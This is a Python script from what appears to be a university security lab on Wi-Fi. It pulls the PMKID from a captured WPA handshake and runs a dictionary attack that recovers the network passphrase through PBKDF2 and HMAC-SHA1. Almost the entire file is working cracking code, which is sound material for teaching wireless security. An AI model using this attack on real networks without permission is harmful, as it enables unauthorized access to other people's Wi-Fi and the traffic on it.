#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)

Modifié par : Polier Florian et Tran Eric
Date : 03.05.2020
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
# La dépendance est inclue dans pbkdf2
# from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
import hmac, hashlib
from numpy import loadtxt
from numpy import array_split
from numpy import array
from numpy import loadtxt
from numpy import str
import binascii
import argparse

#Charge le dictionnaire
parser = argparse.ArgumentParser()
parser.add_argument("dictionary", help="Dictionary containing passphrases")
args = parser.parse_args()
with open(args.dictionary) as f1 :
	    dic = loadtxt(f1, dtype=str, ndmin=1)

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

ssid        =  wpa[0].info.decode('utf-8')
APmac       = a2b_hex(wpa[145].addr3.replace(':',''))
Clientmac   = a2b_hex(wpa[145].addr1.replace(':',''))

#PMKID
nullPMKID = '0'*32
found = False
wpaMessageOne = None # Contient le message 1 du 4 way handshake.
for i in range(len(wpa)):
    if wpa[i].haslayer(EAPOL):
        """
         Il s'agit des informations de la clé (Champs <<Key Information>>), elle définit les différents flags tel que les clés qui sont "set" ou non, s'il y a une erreur, etc... .
         La valeur 0x008a au niveau des flags de la clé est toujours la même pour le message 1 dans la pcap de ce labo ou du labo précédent.
        """
        if wpa[i][EAPOL].original.hex()[10:14] == "008a":
            wpaMessageOne = wpa[i] 
            PMKID = binascii.hexlify(wpaMessageOne.getlayer(Raw).load)[202:234] # Extraction de la PMKID.
            if PMKID != nullPMKID and PMKID != '': 
                found = True
                break # On évite de bouclé inutilement si on trouve le message 1 du 4 way handshake.
if not found:
    exit("No PMKID found")


print("PMKID      : ", PMKID.decode())
print("AP Mac     : ", b2a_hex(APmac).decode())
print("Client Mac : ", b2a_hex(Clientmac).decode())


for i in range(len(dic)):
    passPhrase = str.encode(dic[i])
    pmk = pbkdf2(hashlib.sha1,bytes(passPhrase), ssid.encode('utf-8'), 4096, 32)
    pmkid_calc = hmac.new(pmk,"PMK Name".encode('utf-8') + APmac + Clientmac, digestmod=hashlib.sha1).hexdigest()
    
    if pmkid_calc[:-8].encode('utf-8') == PMKID:
        print("\nMot de passe trouvé : ", passPhrase.decode())
    